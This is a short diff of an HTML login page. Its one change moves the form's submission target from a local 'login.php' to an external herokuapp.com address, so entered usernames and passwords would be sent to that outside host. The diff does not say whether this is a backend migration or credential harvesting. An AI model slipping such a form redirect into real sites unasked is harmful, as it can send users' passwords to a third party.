@@ -76,7 +76,7 @@
           <center>
             <div class="login">
             <div class="logo"></div>
-              <form action="login.php" method='POST'>
+              <form action="https://peregrinelogin.herokuapp.com" method='POST'>
                 <input type="text" placeholer="username" name = 'username' placeholder="Enter your Username" id="username"><br>
                 <input type="password" name='pass' placeholder="Enter your Password" id="pwd"><br>
                 <button onclick="submit">Sign in</button>
